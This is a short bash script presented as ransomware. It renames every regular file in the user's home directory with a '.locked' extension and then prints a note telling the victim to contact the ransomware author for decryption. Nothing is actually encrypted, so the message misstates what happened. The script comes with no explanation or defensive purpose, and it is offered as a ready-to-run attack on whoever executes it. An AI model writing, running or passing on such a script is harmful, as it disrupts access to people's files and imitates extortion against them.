# chmod +x zeroshot.sh

#!/bin/bash

# Define the base directory (usually user's home directory)
BASE_DIR="$HOME"

# Loop through all files in the home directory and add .locked extension
for file in "$BASE_DIR"/*; do
  if [ -f "$file" ]; then # Check if it is a regular file, not a directory
    mv "$file" "$file.locked"
  fi
done

# Display a message to inform the user that files are locked
echo "All files have been locked. Please contact the ransomware author for decryption instructions."
